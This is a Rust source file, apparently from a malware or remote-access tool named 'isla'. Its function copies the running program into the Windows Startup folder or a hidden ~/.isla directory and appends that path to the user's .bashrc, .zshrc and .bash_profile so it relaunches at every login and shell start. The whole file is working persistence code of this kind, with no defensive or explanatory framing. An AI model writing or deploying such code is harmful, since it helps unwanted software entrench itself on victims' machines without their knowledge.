#[cfg(target_os = "linux")]
use std::os::unix::prelude::PermissionsExt;
use std::{
    self,
    io::{Read, Write},
};

pub fn copy_to_startup() {
    let executable_path = std::env::current_exe().unwrap();
    let username = whoami::username();
    let home_folder_path = dirs::home_dir().unwrap();
    let home_folder = home_folder_path.to_str().unwrap();

    let target_folder = if cfg!(windows) {
        format!("C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", username=username)
    } else {
        format!("/home/{username}/.isla", username = username)
    };

    std::fs::create_dir_all(&target_folder).unwrap();

    let target_file = if cfg!(windows) {
        format!("{target_folder}\\isla.exe", target_folder = &target_folder)
    } else {
        format!("{target_folder}/isla", target_folder = &target_folder)
    };

    if target_file != executable_path.to_str().unwrap() {
        std::fs::copy(&executable_path, &target_file).unwrap();
    }

    if cfg!(unix) {
        // Permissions
        fix_file_permissions(&target_file);

        // Inject into startup shells
        let files = [
            format!("{home_folder}/.bashrc", home_folder = &home_folder),
            format!("{home_folder}/.zshrc", home_folder = &home_folder),
            format!("{home_folder}/.bash_profile", home_folder = &home_folder),
        ];

        for file in files.iter() {
            inject_into_shell(&file, &target_file);
        }
    }
}

fn inject_into_shell(shell_file: &str, target_file: &str) {
    let mut file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .append(true)
        .open(shell_file)
        .unwrap();

    let mut contents = String::new();
    file.read_to_string(&mut contents).unwrap();

    if !contents.contains(&target_file) {
        file.write_all(format!("\n{}", target_file).as_bytes())
            .unwrap();
    }
}

#[cfg(target_os = "linux")]
fn fix_file_permissions(path: &str) {
    let mut permissions = std::fs::metadata(path).unwrap().permissions();
    permissions.set_mode(0o770);
    std::fs::set_permissions(path, permissions).unwrap();
}

#[cfg(target_os = "windows")]
fn fix_file_permissions(_path: &str) {
    // Do nothing
}
